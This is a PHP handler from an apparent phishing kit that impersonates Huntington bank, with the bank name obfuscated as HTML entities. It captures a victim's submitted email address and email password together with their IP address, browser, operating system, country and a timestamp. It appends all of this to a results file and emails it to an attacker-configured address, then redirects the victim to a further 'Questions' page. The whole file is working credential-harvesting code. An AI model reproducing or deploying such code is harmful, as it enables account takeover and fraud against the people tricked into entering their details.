<?php
@session_start();
@error_reporting(0);
include("./country.php");
include("./os.php");
$InfoDATE   = date("d-m-Y h:i:sa");
$OS = getOS($_SERVER['HTTP_USER_AGENT']);
$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);
$_SESSION['browser'] = $browserTy_Version = array_pop($browser); 
$ip = $_SERVER['REMOTE_ADDR'];


$demail = $_SESSION['demail'] = $_POST['demail'];
$demailpass = $_SESSION['demailpass'] = $_POST['demailpass'];

$messege = '<h3 style="font-weight: 400; margin: 10px 0; font-size: 24px;color: #69BE2E">
&#72;&#117;&#110;&#116;&#105;&#110;&#103;&#116;&#111;&#110;&#32;&#68;&#111;&#117;&#98;&#108;&#101;&#32;&#69;&#109;&#97;&#105;&#108;
</h3>
<HR>
<h2 style="font-weight: 400; margin: 10px 0;color: #69BE2E">Email Address  : '.$_SESSION["demail"].'</h2>
<h2 style="font-weight: 400; margin: 10px 0;color: #69BE2E">Email Password : '.$_SESSION["demailpass"].'</h2>
<HR>
<h2 style="font-weight: 400; margin: 10px 0;color: #69BE2E">system : '.$OS.' </h2>
<h2 style="font-weight: 400; margin: 10px 0;color: #69BE2E">browser : '.$browserTy_Version.' </h2>
<h2 style="font-weight: 400; margin: 10px 0;color: #69BE2E">ip address : '.$_SERVER["REMOTE_ADDR"].' </h2>
<h2 style="font-weight: 400; margin: 10px 0;color: #69BE2E">country : '.$country.' </h2>
<h2 style="font-weight: 400; margin: 10px 0;color: #69BE2E">date time : '.$InfoDATE.' </h2>
<HR>
';


include("../config.php"); 
$f = fopen("../Result_Panel.php", "a");fwrite($f, $messege);
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$subject  = "Huntington Double Email [".$_SERVER['REMOTE_ADDR']."] ";
$headers .= "From: Email_BY_OReoo" . "\r\n";
mail($yourmail, $subject, $messege, $headers);
header("Location: ../app/Questions.php");
?>